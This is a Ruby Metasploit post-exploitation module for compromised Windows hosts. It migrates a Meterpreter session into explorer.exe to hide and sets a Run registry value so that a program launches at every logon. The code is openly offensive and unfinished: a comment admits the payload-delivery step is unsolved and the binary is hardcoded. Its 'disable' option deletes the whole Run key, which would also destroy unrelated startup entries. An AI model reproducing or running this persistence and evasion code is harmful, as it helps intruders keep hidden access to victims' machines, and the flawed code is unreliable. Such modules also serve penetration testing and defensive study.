##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	
	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Simple Registry Persistence!',
				'Description'   => %q{ This module persists a binary via the reg run command  .},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'Jonathan Cran <jcran[at]metasploit.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ],
				'References'    =>
					[
						[ 'URL', 'http://msdn.microsoft.com/en-us/library/aa376977(v=vs.85).aspx' ]
					]
			))
		register_options(
			[
				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
                                OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
			], self.class)

	end

	def run
	
		if datastore['MIGRATE']
			migrate
		end
		 
		reg_key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
			
		if datastore['DISABLE']
			registry_deletekey(reg_key)
		else
			type = "REG_SZ"
			## this is the hard part -- how to gen a meterpreter binary & stick it on the remote host?
			executable = "C:\\windows\\system32\\systray.exe"
			migrate
			val_name = "Whee"
			data = executable

			registry_setvaldata(reg_key, val_name, executable, type)	
		end
	end
	
        def migrate(pid=nil)
                current_pid = session.sys.process.open.pid
                if pid != nil and current_pid != pid
                        #PID is specified
                        target_pid = pid
                        print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
                        begin
                                session.core.migrate(target_pid)
                        rescue ::Exception => e
                                print_error(e)
                                return false
                        end
                else
                        #No PID specified, assuming to migrate to explorer.exe
                        target_pid = session.sys.process["explorer.exe"]
                        if target_pid != current_pid
                                @old_pid = current_pid
                                print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
                                begin
                                        session.core.migrate(target_pid)
                                rescue ::Exception => e
                                        print_error(e)
                                        return false
                                end
                        end
                end
                return true
        end

	
end
